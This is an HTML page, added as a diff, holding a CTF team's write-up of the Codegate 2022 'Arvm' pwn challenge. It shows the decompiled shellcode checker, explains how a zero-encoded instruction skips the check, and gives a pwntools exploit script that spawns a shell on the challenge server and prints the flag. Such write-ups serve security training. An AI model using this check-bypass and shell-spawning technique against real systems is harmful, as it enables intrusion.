@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Arvm | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Arvm" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/Codegate-2022-quals/pwn/arvm.html" />
+<meta property="og:url" content="https://org.anize.rs/Codegate-2022-quals/pwn/arvm.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Arvm" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Arvm","url":"https://org.anize.rs/Codegate-2022-quals/pwn/arvm.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="arvm">Arvm</h1>
+
+<p><strong>Author</strong>: <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags:</strong> pwn</p>
+
+<p><strong>Points:</strong> 793 (25 solves)</p>
+
+<p><strong>Description:</strong></p>
+
+<blockquote>
+  <p>Welcome! Here is my Emulator. It can use only human.</p>
+
+  <p>Always SMiLEY :)</p>
+</blockquote>
+
+<p>This challenge is an ARM binary running in <code class="language-plaintext highlighter-rouge">qemu-user</code>. The challenge asks us to input up to 4k of ARM machine code, then gives us a choice between running the code, printing it, or replacing it with new code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Running Emulator...
+Welcome Emulator
+Insert Your Code :&gt;
+
+[...]
+
+1. Run Code
+2. View Code
+3. Edit Code
+:&gt;
+</code></pre></div></div>
+
+<p>When we choose to run the code the binary asks us to solve a simple captcha, where we only have to read a number from the challenge and send it back.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Before run, it has some captcha
+Secret code : 0xf40117a4
+Code? :&gt; $ 0xf40117a4
+</code></pre></div></div>
+
+<p>After we pass the captcha, the binary verifies our shellcode (<code class="language-plaintext highlighter-rouge">run()</code>):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">vm</span> <span class="o">*</span><span class="n">vm</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">invalid_insn</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">insn</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Instruction 0x%x is invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">insn</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">run</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span>
+  <span class="kt">uint32_t</span> <span class="n">next_insn</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">insn</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">registers</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">code</span> <span class="o">+</span> <span class="mi">4096</span><span class="p">;</span> <span class="n">insn</span> <span class="o">=</span> <span class="n">next_insn</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">vm</span><span class="o">-&gt;</span><span class="n">registers</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">next_insn</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span><span class="n">vm</span><span class="o">-&gt;</span><span class="n">registers</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span>
+    <span class="n">vm</span><span class="o">-&gt;</span><span class="n">registers</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">insn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">insn</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">sub_11314</span><span class="p">(</span><span class="n">insn</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">v0</span> <span class="o">=</span> <span class="n">sub_1124C</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">v0</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">switch</span> <span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">0u</span><span class="p">:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">sub_117B8</span><span class="p">(</span><span class="n">insn</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">1u</span><span class="p">:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">sub_11D98</span><span class="p">(</span><span class="n">insn</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2u</span><span class="p">:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">sub_11F28</span><span class="p">(</span><span class="n">insn</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="n">next_insn</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">3u</span><span class="p">:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">sub_126EC</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">4u</span><span class="p">:</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">sub_12000</span><span class="p">(</span><span class="n">insn</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="nl">default:</span>
+            <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+          <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="n">invalid_insn</span><span class="p">(</span><span class="n">insn</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If the verification succeeds, the binary runs our shellcode.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">run</code> function is presumably trying to prevent our shellcode from doing something fishy like launching a shell. However I don’t know for sure becauase I didn’t actually reverse the checks.</p>
+
+<p>Instead I noticed that the verification succeeds immediately when it encounters an instruction that encodes to 0. 0 is a valid ARM instruction that is essentially a nop (<code class="language-plaintext highlighter-rouge">andeq r0, r0, r0</code>). This means that we can easily bypass all the checks by prefixing our shellcode with this instruction.</p>
+
+<p>Here is the final exploit script:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'app'</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span>
+    <span class="s">'andeq r0, r0, r0'</span><span class="p">,</span>
+    <span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">(),</span>
+<span class="p">]))</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'15.165.92.159'</span><span class="p">,</span> <span class="mi">1234</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./run.sh'</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Insert Your Code :&gt; '</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Secret code : 0x'</span><span class="p">)</span>
+<span class="n">captcha</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(),</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">captcha</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'cat flag*'</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">stream</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 exploit.py REMOTE
+codegate2022{79d1bafd64f2e49a5bc60e001d179c23ce05f43a5145ea1ff673a51fbe81d8baf846e3adab31d65792838d73b06047822fb419ebc522}
+</code></pre></div></div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
